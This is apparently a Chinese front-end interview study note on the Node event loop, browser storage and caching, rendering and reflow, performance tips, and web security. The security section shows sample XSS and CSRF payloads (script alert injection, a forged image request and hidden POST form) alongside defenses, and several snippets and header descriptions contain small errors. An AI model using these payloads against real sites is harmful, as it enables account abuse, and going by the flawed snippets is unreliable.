和浏览器的不相同 Node 中的 Event loop 分成了6个阶段，它们会按照顺序反复执行 123456789101112131415161718┌──────────────────────────┐┌─&gt;│ timers ││ └──────────┬────────────┘│ ┌──────────┴────────────┐│ │ I/O callbacks ││ └──────────┬────────────┘│ ┌──────────┴────────────┐│ │ idle, prepare ││ └──────────┬────────────┘ ┌───────────────┐│ ┌──────────┴────────────┐ │ incoming: ││ │ poll │&lt;──connections─── ││ └──────────┬────────────┘ │ data, etc. ││ ┌──────────┴────────────┐ └───────────────┘│ │ check ││ └──────────┬────────────┘│ ┌──────────┴────────────┐└──┤ close callbacks │ └───────────────────────┘ timertimer 阶段会执行 setTimeout 和 setInterval 一个 timer 指定的时间并不是准确的时间，而是达到这个事件后尽快执行回调，可能会因为系统正在执行别的事务而延迟 下限的时间有一个范围：[1,2147483647]，如果设置的时间不在范围内，将被设置为 1. I/OI/O 阶段会执行除了 close 事件，定时器和 setImmediate 的回调 idle,prepareidle，prepare 阶段内部实现 pollpoll 阶段很重要，在这一阶段中，系统会做两件事情 执行到点的定时器 执行 poll 队列中的事件 并且当 poll 中没有定时器的情况下，会发现以下两件事情 如果poll队列不为空，会遍历回调队列并同步执行，直到队列为空或者系统限制 如果poll队列为空,会发生两件事情 如果有 setImmediate 需要执行的时候，poll 阶段会停止并且进入到 check 阶段执行 setImmediate 如果没有 setImmediate 需要执行，会等待回调被加入到队列中并立即执行回调 checkcheck 阶段执行 setImmediate close callbacksclose callbacks 阶段执行 close 事件 并且在 Node 中，有些情况下的定时器执行顺序是随机的 12345678910setTimeout(()=&gt;&#123; console.log('setTimeout'); &#125;,0)setImmediate(()=&gt;&#123; console.log('setImmediate');&#125;)// 这里可能会输出 setTimeout，setImmediate// 可能也会相反的输出，这取决于性能// 因为可能进入 event loop 用了不到 1 毫秒，这时候会执行 setImmediate// 否则会执行 setTimeout 当然在这种情况下，执行顺序是相同的 1234567891011121314var fs = require('fs')fs.readFile(__filename, () =&gt; &#123; setTimeout(() =&gt; &#123; console.log('timeout') &#125;, 0) setImmediate(() =&gt; &#123; console.log('immediate') &#125;)&#125;)// 因为 readFile 的回调在 poll 中执行// 发现有 setImmediate ，所以会立即跳到 check 阶段执行回调// 再去 timer 阶段执行 setTimeout// 所以以上输出一定是 setImmediate，setTimeout 上面介绍的都是 macrotask 的执行情况，microtask 会在以上每个阶段完成后立即执行。 1234567891011121314151617181920setTimeout(() =&gt; &#123; console.log('timer1') Promise.resolve().then(function() &#123; console.log('promise1') &#125;)&#125;, 0)setTimeout(() =&gt; &#123; console.log('timer2') Promise.resolve().then(function() &#123; console.log('promise2') &#125;)&#125;, 0)// 以上代码在浏览器和 node 中打印情况是不同的// 浏览器中一定打印 timer1, promise1, timer2, promise2// node 中可能打印 timer1, timer2, promise1, promise2// 也可能打印 timer1, promise1, timer2, promise2 Node 中的 process.nextTick 会先于其他 microtask 执行。 123456789101112setTimeout(() =&gt; &#123; console.log('timer1') Promise.resolve().then(function() &#123; console.log('promise1') &#125;)&#125;, 0)process.nextTick(() =&gt; &#123; console.log('nextTick')&#125;)// nextTick, timer1, promise1 存储cookie,localStorage,sessionStorage,indexDB 特性 cookie localStorage sessionStorage indexDB 数据生命周期 一般由服务器生成，可以设置过期时间 除非被清理，否则一直都在 页面关闭就清理 除非被处理，否则一直都在 数据存储大小 4K 5M 5M 无限 与服务端通信 每次都会携带在 header 中，对于请求性能影响 不参与 不参与 不参与 cookie 不建议用于存储，如果没有大量的数据存储需求的话，可以使用 localStorage 和 sessionStorage。对于不怎么改变的数据使用 localStorage 存储，否则可以用 sessionStorage 存储。 对于 cookie 我们还需要 注意安全性 属性 作用 value 如果用于保存用户登录状态，应该将该值加密，不能使用明文的用户标识 http-only 不能通过 JS 访问 Cookie，减少 XSS 攻击 secure 只能在协议为 HTTPS 的请求中携带 same-site 规定浏览器不能在跨域请求中携带 Cookie，减少 CSRF 攻击 Service Worker Service Worker 是运行在浏览器后面的独立线程，一般可以用来实现缓存功能，使用 Service Worker 传输协议必须为 HTTPS，以为 Service Worker 中涉及到拦截，所以必须使用 HTTPS 协议来保障安全。 Service Worker 实现缓存功能一般分成三个步骤：首先你需要先注册 Service Worker ，然后监听到 install 事件以后就可以缓存需要的文件，那么在下次用户访问的时候就可以通过拦截请求的方式查找是否存在缓存。，存在缓存的话就可以直接读取缓存文件，否则就去请求数据，下面是这个步骤的实现： 123456789101112131415161718192021222324252627282930// index.jsif(navigator.serviceWorker)&#123; navigator.serviceWorker.register('sw.js') .then(function(registration)&#123; console.log('service worker 注册成功'); &#125;).catch(function(err)&#123; console.log('service worker 注册失败'); &#125;);&#125;// sw.js// 监听 install 事件，回调中缓存所需文件self.addEventListener('install',e=&gt;&#123; e.waitUntil( caches.open('my-cache').then(function(cache)&#123; return cache.addAll(['./index.html','./index.js']) &#125;); )&#125;);// 拦截所有请求// 如果缓存中已经有请求的数据就直接用缓存，否则就去请求数据self.addEventListener('fetch',e=&gt;&#123; e.respondWith( cache.match(e.request).then(function(response)&#123; if(response) return response; console.log('fetch source'); &#125;) )&#125;); 这个内容在 我的一篇 webpack4.x从基础到实战笔记中也有提及 缓存机制性能优化领域相关面试题目 缓存是性能优化中简单高效的一种优化方式，可以显著减少网络传输带来的损耗 对于一个数据来说，可以分成网络请求，后端处理，浏览器响应三个步骤。浏览器缓存可以帮助我们在第一步和第三步中优化性能。如果直接使用缓存而不发起请求，或者发送了请求但是后端存储的数据和前端的一样，那么就没有必要再将数据回传过来，这样就减少了响应数据。 可以分几个部分来讲这个浏览器缓存机制： 缓存位置 Service Worker Memory Cache Disk Cache Push Cache 网络请求 Service Worker Service Worker 的缓存与浏览器中其他内建的缓存机制是不同的，它可以让我们自由控制缓存文件，如何匹配、读取缓存，并且缓存是持续性的。 当 Service Worker 没有命中缓存的时候，我们需要去调用 fetch 函数获取数据。也就是说，如果我们没有在 Service Worker 命中缓存的话，会根据缓存优先级去查找数据。但是不管我们是从 Memory Cache 中还是从网络请求中获取的数据，浏览器都会显示我们是从 Service Worker 中获取的内容。 Memory Cache Memory Cache 也就是内存中的缓存，读取内存中的数据肯定比磁盘的块。但是内存缓存虽然读取高效，可是缓存持续性很短，会随着进程的释放而释放，一旦我们关闭了 Tag 页面，内存中的缓存也就被释放了。 Dish Cache Disk Cache 也就是存储在硬盘中的缓存，读取速度是慢点，但是什么都能存储在磁盘中，与 Memory Cache 相比胜在容量和 存储时效性上面。 在所有浏览器中，Disk Cache 覆盖面基本是最大的，它会根据 HTTP Header 中的字段来判断哪些资源需要缓存，哪些资源可以不请求直接使用，哪些资源已经过期需要重新请求。并且及时在跨站点的情况下，相同地址的资源一旦被硬盘缓存下来，就不会再次去请求数据。 Push Cache Push Cache 是 HTTP/2 中的内容。当以上三种缓存都没有命中时才会被使用，并且缓存时间也很短暂，只会在会话 （session）中存在，一旦会话结束便会被释放。 所有的资源都能被推送，但是 Edge 和 Safari 浏览器兼容性不怎么好 可以推送 no-cache 和 no-store 的资源 一旦连接被关闭，Push Cache 就被释放 多个页面可以使用相同的 HTTP/2 连接，也就是说能使用同样的缓存 Push Cache 中的缓存只能被使用一次 浏览器可以拒绝接受已经存在的资源推送 你可以给其他域名推送资源 HTTP/2 push is tougher than I thought 网络请求 如果所有缓存都没有命中的话，那么只能发起网络请求来获取资源了。 在性能上面考虑，大部分接口都应该选择好缓存策略 缓存策略通常浏览器的缓存策略分成两种，强缓存和协商缓存，并且缓存策略都是通过设置 HTTP Header 来实现的。 强缓存 强缓存可以设置两种 HTTP Header 来实现：Expires 和 Cache-Control。强缓存表示在缓存期间不需要请求，state code 为 200 Expires 1Expires: Sat,20,Apr 2019 10:06:00 GMT Expires 是 HTTP/1 的产物，表示资源会在 Sat,20,Apr 2019 10:06:00 GMT 后过期，需要再次请求。并且 Expires 受限于本地时间，如果修改了本地时间，可能会造成缓存失效。 Cache-Control 1Cache-Control:max-age=30 Cache-Control 出现于 HTTP/1.1，优先级高于 Expires，该属性值表示资源会在 30秒后过去，需要再次请求。 Cache-Control 可以在请求头或者响应头中设置，并且可以组合使用多种指令。比如希望资源能被缓存下来，并且是客户端是代理服务器都能缓存，还能设置缓存失效时间等。 指令 作用 public 表示响应可以被客户端和代理服务器缓存 private 表示响应只可以被客户端缓存 max-age=30 缓存30秒后失效，需要重新请求 s-maxage=30 覆盖 max-age 作用是一样的，只在代理服务器中生效 no-store 不缓存任何响应 no-cache 资源被缓存，但是立即失效，下次会发起请求验证资源是否过期 max-stale=30 30秒内，即使缓存失效了，也使用该缓存 min-fresh=30 希望30秒内获取最新的响应 协商缓存 如果缓存过期了，就需要发起请求验证资源是否需要更新。协商缓存可以通过设置两种 Http header 来实现：Last-Modifier 和 ETag 当浏览器发起请求验证资源的时候，如果资源没有做改变，那么服务器就会返回 304 状态码，并且更新浏览器缓存的有效期。 Last-Modified 和 If-Modified-Since Last-Modified 表示本地文件最后修改日期。If-Modifier-Since 会将 Last-Modifier 的值发送给服务器，询问服务器在该日期后资源是否有更新，有更新的话就会将新的资源发送回来，否则返回 304 状态码 但是 Last-Modifier 存在一些弊端： 如果本地打开缓存文件，即使没有对文件进行修改，但还是会造成 Last-Modified 被修改，服务端不能命中缓存导致发送相同的资源 因为 Last-Modified 只能以秒计时，如果在不可感知的时间内修改完成文件，那么服务端会认为资源还是命中了，不会返回正确的资源 因为这些弊端所有出现了 ETag ETag 和 If-None-Match ETag 类似于文件指纹，If-None-Match 会将当前的 Etag 发送给服务器，询问该资源 ETag 是否发生了变化，如果有变动的话就将新的资源发送回来。并且 ETag 的优先级比 Last-Modifier 搞。 那么如果什么缓存策略都没有设置，浏览器会怎么处理？ 对于这种情况，浏览器会采用一个启发式算法，通常会取响应头的 Date 减去 Last-Modifier 值的 10% 作为缓存时间。 实际场景引用缓存策略频繁变动的资源 首先使用 Cache-Control：no-cache 使得浏览器每次都请求服务器，然后配合 ETag 和 Last-Modifier 来验证资源是否有效。这样的做法虽然不能节省请求数量，但是能显著减少响应数据大小 代码文件 指除了 HTML 之外的代码的文件。因为HTML 文件一般不缓存或者缓存时间很短。 一般来说，都会使用打包工具，webpack 等等来对文件名进行哈希处理，只有当代码修改过后才会生成新的文件名。这样我们就可以给文件设置一个缓存有效期一年 Cache-Control:max-age=31536000 这样就只有当 HTML 文件引入的文件名发生了改变的时候才会去下载最新的代码文件，否则就会一直使用缓存。 其他优化其实除了缓存的优化可以让性能显著提高，另外一个很重要点的是在开发阶段，尽量使用按需加载的原则来开发，增加代码的使用率从源头来优化性能，可能效果会更加显著。 在浏览器地址栏键入 URL，按下回车之后会经历一下流程 解析 url 到 dns 服务器 dns 服务器返回 ip 地址到浏览器 跟随协议将 ip 发送到网络中 经过局域网达到服务器 进入服务器的 MVC 架构 controller 经过逻辑处理，请求分发，调用 Model Model 与数据 进行交互，然后读取数据库，将结果通过 view 层返回到网络回到浏览器 浏览器根据请求回来的 html 和关联的css js 文件进行渲染 在渲染的过程中，浏览器根据 html 生成 dom 树，根据 css 生成 css 树 将 dom 树和 css 树进行整合，最终知道 dom 节点的样式，在页面上进行样式渲染 浏览器去执行 js 脚本 最终展示页面 渲染机制HTML=&gt;DOM 树打开一个网页时，浏览器会去请求对应的 HTML 文件，拿到 JS/CSS/HTML 文件的字符串，但是计算机是不理解这些字符串的，在网络中传输的内容都是01 字节数据。当浏览器接收到这些字节数据后，它会将这些字节数据转换为字符串，也就是我们写的代码。 当数据被转换成字符以后，浏览器会将这些字符串通过词法分析转换为标记（Token），这一过程叫做标价化（tokenization） 打标记会将代码分成一块块，然后打上标记，便于理解这些最小单位的代码的含义。结束标记化后开始转换为 Node，最后这些 Node 会根据不同 Node 之间的联系构建为一颗 DOM 树 1字节数据 =&gt; 字符串 =&gt; Token =&gt; Node =&gt; DOM CSS =&gt; CSSDOM 树与上面的过程是类似的。在这一过程中浏览器会确定下每一个节点的样式是什么，并且在这一过程中是很消耗资源的。浏览器得递归 CSSDOM 树，然后确定具体的元素到底是什么样式 1字节数据 =&gt; 字符串 =&gt; Token =&gt; Node =&gt; CSSDOM 生成渲染树将 DOM 与 CSSOM 合并为一个渲染树 这一过程不是简单将两者结合，渲染树只会包括㤇显示的节点和这些节点样式信息，如果某个节点是 display:none 的，那么就不会在渲染树中显示 当浏览器生成渲染树以后，就会根据渲染树来进行布局（也可以叫做回流），然后调用 GPU 绘制，合成图层，显示在屏幕上。 浏览器的渲染机制一般分成下面几个步骤 处理 HTML 并构建 DOM 树 处理 CSS 构建 CSSOM 树 将 DOM 与 CSSOM 合并为一个渲染树 根据渲染树来布局，计算每个节点位置 调用 GPU 绘制，合成图层，显示在屏幕上 经典面试题目：插入几万个 DOM，如何实现页面不卡顿？因为 DOM 是属于渲染引擎中的东西，而 JS 又是 JS 引擎中的东西。当我们通过 JS 操作 DOM 的时候，其实这个操作涉及到了两个线程之间的通信，那么势必会带来一些性能上的损耗。操作 DOM 次数一多，也就等同于一直在进行线程之间的通信，并且操作 DOM 可能还会带来重绘回流的情况，所以也就导致了性能上的问题。 对于这道题目来说，首先我们肯定不能一次性把几万个 DOM 全部插入，这样肯定会造成卡顿，所以解决问题的重点应该是如何分批次部分渲染 DOM。大部分人应该可以想到通过 requestAnimationFrame的方式去循环的插入 DOM，其实还有种方式去解决这个问题：虚拟滚动（virtualized scroller）。 这种技术的原理就是只渲染可视区域内的内容，非可见区域的那就完全不渲染了，当用户在滚动的时候就实时去替换渲染的内容。 当我们滚动页面的时候就会实时去更新 DOM，这个技术就能顺利解决这道经典面试题。了解更多点击 react-virtualized。 掘金上的方案 方案一：分页，懒加载，把数据分页，然后每次接受一定的数据，避免一次性接收太多 方案二：setInterval，setTimeout，requestAnimationFrame 分批渲染，让数据在不同帧内去做渲染 方案三：使用 virtual-scroll，虚拟滚动。 virtual-scroll 虚拟滚动，这种方式是指根据容器元素的高度以及列表项元素的高度来显示长列表数据中的某一个部分，而不是去完整地渲染长列表，以提高无限滚动的性能。 virtual-scroll 原理，在用户滚动时，改变列表可视区域的渲染部分 计算当前可见区域起始数据的 startIndex 计算当前可见区域结束数据的 endIndex 计算当前可见区域的数据，并渲染到页面中 计算 startIndex 对应的数据在整个列表中的偏移位置 startOffset 并设置到列表上 计算 endIndex 对应的数据相对于可滚动区域最底部的偏移位置 endOffset，并设置到 列表上 startOffset 和 endOffset 会撑开容器元素的内容高度，让其可持续的滚动；此外，还能保持滚动条处于一个正确的位置。 阻塞渲染的情况首先渲染是生成渲染树，所以 HTML 和 CSS 肯定会阻塞渲染，如果想要渲染更快，就应该降低一开始需要渲染的文件大小，并且扁平层级，优化选择器。 然后当浏览器在解析到 script 标签的时候，会暂停构建 DOM ，完成之后才会从暂停的地方重新开始。也就是说，，如果你想首屏渲染的越快，就越不应该在首屏就加载 JS 文件，这也是都建议将 script 标签放在 body 标签底部的原因。 也可以给 script 标签添加 defer 或者 async 属性。当 script 标签加上 defer 属性以后，表示该 JS 文件会并行下载，但是会放到 HTML 解析完成后顺序执行，所以对于这种情况你可以把 script 标签放在任意位置。对于没有任何依赖的 JS 文件可以加上 async 属性，表示 JS 文件下载和解析不会阻塞渲染。 Load 和 DOMContentLoaded 区别Load 事件触发代表页面中的 DOM ，CSS ，JS ,图片已经全部加载完毕 DOMContentLoaded 事件触发代表初始的 HTML 被完全加载和解析，不需要等待 CSS，JS 和图片加载. 图层一般来说，可以把普通文档流看做是一个图层。特定的属性可以生成一个新的图层。不同的图层渲染互不影响，所以对于某些频繁需要渲染的建议单独生成一个新图层，提高性能。但也不能生成过多的图层，会引起反作用。 通常下面几个常用属性可以生成新图层 3D 变换：translate3d，translateZ will-change video,iframe 标签 通过动画实现的 opacity 动画转换 position：fixed 重绘（Repaint） 和 回流（Reflow）重绘和回流是渲染步骤中的一小节，但是这两个步骤对于性能影响很大。 重绘是当节点需要更改外观而不影响布局的时候，比如改变 color ，就叫做重绘 回流是布局或者几何属性需要改变就成为回流 回流必定会引起重绘，重绘不一定会引起回流。回流所需要的成本比重绘高德多，改变深层次的节点很可能会导致父节点的一系列回流。 所以一下几个动作可能会导致性能问题： 改变 window 大小 改变字体 添加或者删除样式 文字改变 定位或者浮动 盒模型 重绘和回流其实和 Event Loop 有关 当 Event Loop 执行完 Microtasks 后，会判断 document 是否需要更新。因为 浏览器是 60HZ 的刷新率，也就是 16.6ms 才会更新一次 判断是否有 resize 或者 scroll ，有点话就回去触发事件，所以 resize 和 scroll 事件也是至少 16ms 才会触发一次，并且自带节流功能。 判断是否触发了 media query 更新动画并且发送时间 判断是否有全屏操作事件 执行 requestAnimationFrame 回调 执行 IntersectionObserver 回调，该方法用于判断元素是否可见，可以用于懒加载上面，但是兼容性不是很好 更新界面 以上就是一帧中可能会做的事情，如果在一帧中有空闲时间，就会去执行 requestIdleCallback 回调 减少重绘和回流使用 translate 替代 top 12345678910111213141516&lt;div class='test'&gt;&lt;/div&gt;&lt;style&gt; .test&#123; position:absolute; top:10px; width:100px; height:100px; background:red; &#125;&lt;/style&gt;&lt;script&gt; setTimeout(()=&gt;&#123; // 引起回流 document.querySelector('.test').style.top = '100px'; &#125;,1000);&lt;/script&gt; 使用 visibility 替代 display:none，因为前者只会引起重绘，后者会引起回流（改变了布局） 把 DOM 离线后修改。比如：先 把 DOM 给 display:none(有一次回流)，然后你修改100次，然后再把它显示出来。 不要把 DOM 结点的属性值放在一个循环里当做循环里的变量 1234for(let i=0;i&lt;1000;i++)&#123; // 获取 offsetTop 会导致回流，因为需要去获取正确的值 console.log(document.querySelector('.test').style.offsetTop);&#125; 不要使用 table 布局，可能一个很小的改动都会造成整个 table 的重新布局 动画实现的速度的选择，动画速度越快，回流次数越多，也可以使用 requestAnimationFrame CSS 选择符从右往左匹配查找，避免 DOM 深度过深 将频繁运行的动画变成图层，图层能够阻止该节点回流影响别的元素。比如对于 video 标签，浏览器会自动将该节点变成图层 性能网络相关DNS 预解析DNS 解析也是需要时间的，可以通过预解析的方式来预先获得域名所对应的 IP 1&lt;link rel="dns-prefetch" href="//xxx.cn"&gt;&lt;/link&gt; 缓存缓存对于前端性能优化来说是一个重要的点，良好的缓存策略可以降低资源的重复加载提高网页的整体加载速度。 通常浏览器缓存策略分成两种：强缓存和协商缓存。 强缓存实现强缓存可以通过两种响应头实现：Expires 和 Cache-Control 。强缓存表示在缓存期间不需要请求，state code 为 200 1Expires:Tue,09 Apr 2019 08:39:00 GMT Expires 是 HTTP/1.0 的产物，表示资源会在上述时间后过期，需要再次请求，并且 Expires 受限于本地时间，如果修改了本地时间，可能会造成缓存失效。 1Cache-control:max-age=30 Cache-control 出现于 HTTP/1.1 优先级高于 Expires。该属性表示自愿会在 30秒后过期，需要再次请求。 协商缓存如果缓存过期了，我们就可以使用协商缓存来解决问题。协商缓存需要请求，如果缓存有效会返回 304,、 协商缓存需要客户和服务端共同实现，和强缓存一样，也有两种实现方式。 Last-Modified 和 If-Modified-Since Last-Modified 表示本地文件最后修改日期，If-Modified-Since 会将 Last-Modified 的值发送给服务器，询问服务器在该日期后资源是否有更新，有更新的话就会将新的资源发送回来。 但是如果在本地打开缓存文件，就会造成 Last-Modified 被修改，所以在 HTTP/1.1 出现了 ETag ETag 和 If-None-Match ETag 类似于文件指纹，If-None-Match 会将 当前的 Etag 发送给服务器，询问该资源 Etag 是否变动，如果有变动的话就将新的资源发送回来，并且 ETag 优先级比 Last-Modified 高。 选择合适的缓存策略对于大部分的场景都可以使用强缓存配合协商缓存来解决，但是有一些特殊的地方可能需要选择特殊的缓存策略： 对于某些不需要缓存的资源，可以使用 Cache-control:no-store 来表示该资源不需要缓存 对于频繁变动的资源，可以使用 Cache-control:no-cache 并配合 ETag 使用，表示该资源已被缓存，但是每次都会发送请求询问资源是否更新。 对于代码文件来说，通常使用 Cache-control:max-age=31536000 并配合策略缓存使用，然后对文件进行指纹处理，一旦文件名变动就会立刻下载新的文件。 使用 HTTP/2.0因为浏览器会有并发请求的限制，在 HTTP/1.1 时代，每个请求都需要建立和断开，消耗了好几个 RTT 时间，并且由于 TCP 慢启动的原因，加载体积大的文件会需要更多的时间 在 HTTP/2.0 中引入了多路复用，能够让多个请求使用同个 TCP 链接，极大的加快了网页的加载速度。还支持 Header 压缩，进一步叫上了请求的数据大小 预加载 预加载是声明式的 fetch，强制浏览器请求资源，并且不会阻塞 onload 事件，可以使用下面的代码： 1&lt;link rel="preload" href="xxx.com"&gt;&lt;/link&gt; 预加载可以一定程度上降低首屏的时间，因为可以将一些不响应首屏但是重要的文件延后，唯一的缺点就是兼容性不好。 预渲染可以通过预渲染将下载的文件预先在后台渲染，可以使用下面的代码开启： 1&lt;link ref="prerender" href="xxx.com"&gt;&lt;/link&gt; 预渲染可以提高页面的架子啊速度，但是要确保该页面百分之百会被用户之后打开，否则就白白浪费资源了。 优先渲染过程懒执行懒执行就是将某些逻辑延后到使用时再计算。该即使可以用于首屏优化，对于某些耗时逻辑并不需要在首屏就使用的，就可以使用懒执行。懒执行需要唤醒，一般可以通过定时器或者事件的回调来唤醒 懒加载懒加载就是将不关键的资源延后加载 懒加载的原理就是只加载自定义区域（通常是可视区域，但也可以是即将进入可视区域）内需要加载的东西，对于图片来说，先设置图片的 src 属性为一张占位图，将真实的图片资源放入一个自定义属性中，当进入自定义区域的时候，就将自定义属性替换成 src 属性，这样图片就会下载资源，实现了图片的懒加载。 懒加载不仅可以用于图片，也可以使用在别的资源上，比如进入可视区域才开始播放视频等等。 文件优化图片优化计算图片大小对于一张100*100 的像素的图片来说，有 10000 个像素点，如果每个像素点都是用 RGBA 存储的话，每个像素有四个通道，每个通道有 1 个字节（8位=1个字节），所以图片的大小大概为39KB（10000x1x4/1024） 但是在实际项目中，一张图片可能并不需要使用那么多颜色去显示，我们可以通过减少每个像素的调色板来对应缩小图片的大小。 大致有两个思路： 减少像素点 减少每个像素点能够显示的颜色 图片加载优化 不用图片，能用 CSS 显示的尽量不要使用图片 移动端来说，一般图片都用 CDN 加载，可以计算出适配屏幕宽度，然后去请求对应裁剪好的图片 小图使用 base64 格式 将多个图片整合在一张雪碧图 选择正确的图片格式 对于能够显示 WebP 格式的浏览器尽量使用 WebP 格式。因为这个格式具有更好的图像数据压缩算法，能带来更小的图片体积，而且拥有肉眼识别无差别的图片质量，缺点就是兼容性不好。 小图使用 Png，其实对于大部分图标这种图片，可以使用 SVG 代替 照片使用 JPEG 其他文件优化 CSS 文件放在 head 中 服务端开启文件压缩功能 将 script 标签放在 body 的底部，因为 JS 文件执行会阻塞渲染，当然也可以将 script 放在任何地方，然后加上 defer ,表示该文件并行下载，但是会放在 HTML 解析完成后顺序执行。对于没有任何依赖的 JS 文件加上 async 表示加载和渲染文档元素的过程和 JS 文件的加载与执行并行无序进行 执行 JS 代码过长会卡住渲染，对于需要时间计算的代码可以考虑使用 Webworker 。它可以让我们另开一个线程执行脚本而不影响渲染。 CDN静态资源尽量使用 CDN 加载，由于浏览器对于单个域名有并发请求上限，可以考虑使用多个 CDN 域名。对于 CDN 加载静态资源需要注意的是 CDN 域名要与主站不同，否在每次请求都会带上主站的 cookie 其他使用 Webpack 优化项目 对于 Webpack4，打包项目使用 production 模式，这样会自动开启代码压缩 使用 ES6 模块来开启 tree shaking，这个技术可以移除没有使用的代码 优化图片，对于小图可以使用 base64 的方式写入文件中 按照路由拆分代码，实现按需加载 给打包出来的文件名添加哈希，实现浏览器缓存文件 监控对于代码运行错误，通常的办法是使用 window.onerror 拦截报错。该方法能拦截到大部分的详细报错信息，但是也有例外 对于跨域的代码运行错误会显示 Script error. 对于这种情况我们需要给 script 标签添加 crossorigin 属性 对于某些浏览器可能不会显示调用栈信息，这种情况可以通过 arguments.callee.caller 来做栈递归 对于异步代码来说，可以使用 catch 的方式捕获错误。比如 Promise 可以直接使用 catch 函数，async await 可以使用 try catch 但是要注意线上运行的代码都是压缩过的，需要在打包时生成 sourceMap 文件便于 debug。 对于捕获的错误需要上传给服务器，通常可以通过 img 标签的 src 发起一个请求。 面试题如何渲染几万条数据并不卡住页面 12345678910111213141516171819202122232425setTimeout(() =&gt; &#123; const total = 100000; const once = 20; const loopCount = total / once; let countOfRender = 0; let ul = document.querySelector('ul'); function add() &#123; // 优化性能，插入不会造成回流 const fragment = document.createDocumentFragment(); for (let i = 0; i &lt; once; i++) &#123; const li = document.createElement('li'); li.innerHTML = Math.floor(Math.random() * total); fragment.appendChild(li); &#125; ul.appendChild(fragment); countOfRender += 1; loop(); &#125; function loop() &#123; if (countOfRender &lt; loopCount) &#123; window.requestAnimationFrame(add); &#125; &#125; loop();&#125;, 0); 安全XSS跨网站指令码（英语：Cross-site scripting，通常简称为：XSS）是一种网站应用程式的安全漏洞攻击，是代码注入的一种。它允许恶意使用者将程式码注入到网页上，其他使用者在观看网页时就会受到影响。这类攻击通常包含了 HTML 以及使用者端脚本语言。 XSS 分为三种：反射型，存储型和 DOM-based 如何攻击XSS 通过修改 HTML 节点或者执行 JS 代码来攻击网站 例如通过 URL 获取某些参数 12&lt;!-- http://www.domain.com?name=&lt;script&gt;alert(1)&lt;/script&gt; --&gt;&lt;div&gt;&#123;&#123;name&#125;&#125;&lt;/div&gt; 上述 URL 输入可能会将 HTML 改为 &lt;div&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/div&gt; ，这样页面中就凭空多了一段可执行脚本。这种攻击类型是反射型攻击，也可以说是 DOM-based 攻击。 也有另一种场景，比如写了一篇包含攻击代码 &lt;script&gt;alert(1)&lt;/script&gt; 的文章，那么可能浏览文章的用户都会被攻击到。这种攻击类型是存储型攻击，也可以说是 DOM-based 攻击，并且这种攻击打击面更广。 如何防御最普遍的做法是转义输入输出的内容，对于引号，尖括号，斜杠进行转义 12345678910function escape(str)&#123; str = str.replace(/&amp;/g,'&amp;amp;') str = str.replace(/&lt;/g,'&amp;lt;') str = str.replace(/&gt;/g,'&amp;gt;') str = str.replace(/"/g,'&amp;quto;') str = str.replace(/'/g,'&amp;#39;') str = str.replace(/`/g,'&amp;#96;') str = str.replace(/\//g,'&amp;#x2F;') return str;&#125; 通过转义可以将攻击代码 &lt;script&gt;alert(1)&lt;/script&gt; 变成 12// -&gt; &amp;lt;script&amp;gt;alert(1)&amp;lt;&amp;#x2F;script&amp;gt;escape('&lt;script&gt;alert(1)&lt;/script&gt;') 对于显示富文本来说，不能通过上面的办法来转义所有字符，因为这样会把需要的格式也过滤掉。这种情况通常采用白名单过滤的办法，当然也可以通过黑名单过滤，但是考虑到需要过滤的标签和标签属性实在太多，更加推荐使用白名单的方式。 1234var xss = require('xss')var html = xss('&lt;h1 id="title"&gt;XSS Demo&lt;/h1&gt;&lt;script&gt;alert("xss");&lt;/script&gt;')// -&gt; &lt;h1&gt;XSS Demo&lt;/h1&gt;&amp;lt;script&amp;gt;alert("xss");&amp;lt;/script&amp;gt;console.log(html) 以上示例使用了 js-xss 来实现。可以看到在输出中保留了 h1 标签且过滤了 script 标签 CSP内容安全策略 (CSP) 是一个额外的安全层，用于检测并削弱某些特定类型的攻击，包括跨站脚本 (XSS) 和数据注入攻击等。无论是数据盗取、网站内容污染还是散发恶意软件，这些攻击都是主要的手段。 我们可以通过 CSP 来尽量减少 XSS 攻击。CSP 本质上也是建立白名单，规定了浏览器只能够执行特定来源的代码。 通常可以通过 HTTP Header 中的 Content-Security-Policy 来开启 CSP 只允许加载本站资源 1Content-Security-Policy:default-src 'self' 只允许加载 HTTPS 协议图片 1Content-Security-Policy:img-src https://* 允许加载任何来源框架 1Content-Security-Policy:child-src 'none' 更多属性可以查看 这里 CSRF跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的 Web 应用程序上执行非本意的操作的攻击方法。[1] 跟跨網站指令碼（XSS）相比，XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。 简单点说，CSRF 就是利用用户的登录态发起恶意请求。 如何攻击假设网站中有一个通过 Get 请求提交用户评论的接口，那么攻击者就可以在钓鱼网站中加入一个图片，图片的地址就是评论接口 1&lt;img src="http://www.domain.com/xxx?comment='attack'" /&gt; 如果接口是 Post 提交的，就相对麻烦点，需要用表单来提交接口 123&lt;form action="http://www.domain.com/xxx" id="CSRF" method="post"&gt; &lt;input name="comment" value="attack" type="hidden" /&gt;&lt;/form&gt; 如何防御防范 CSRF 可以遵循以下几种规则： Get 请求不对数据进行修改 不让第三方网站访问到用户的 Cookie 阻止第三方网站请求接口 请求时附带验证信息，比如验证码或者是 token SameSite 可以对 Cookie 设置 SameSite 属性，该属性设置 Cookie 不随着跨域请求发送，该属性可以很大程度减少 CSRF 的攻击，但是该属性目前并不是所有浏览器都兼容的 验证 Referer 对于需要防范 CSRF 的请求，我们可以通过验证 Referer 来判断该请求是否为第三方网站发起的 Token 服务器下发一个随机 Token （算法不能复杂），每次发起请求时都将 Token 携带上，服务器验证 Token 是否有效 点击劫持是一种视觉欺骗的攻击手段 如何攻击攻击者将需要攻击的网站通过 iframe 嵌套的方式嵌入自己的网页中，并将 iframe 设置为透明，在页面中透出一个按钮诱导用户点击。 如何防御X-FRAME-OPTIONS 是一个 HTTP 响应头，为了防御用 iframe 嵌套的点击劫持攻击。 可以设置三个值，分别是 DENY,表示页面不允许通过 iframe 的方式来展示 SAMEORIGHT,表示页面在相同的域名下来通过 iframe 的方式展示 ALLOW-FROM,表示页面可以在指定来源的 iframe 中展示 中间人攻击中间人攻击是攻击方同时与服务端和客户端建立起了连接，并让对方认为连接是安全的，但是实际上整个通信过程都被攻击者控制了。攻击者不仅能获得双方的通信信息，还能修改通信信息。 通常来说不建议使用公共的 Wi-Fi，因为很可能就会发生中间人攻击的情况。如果你在通信的过程中涉及到了某些敏感信息，就完全暴露给攻击方了。 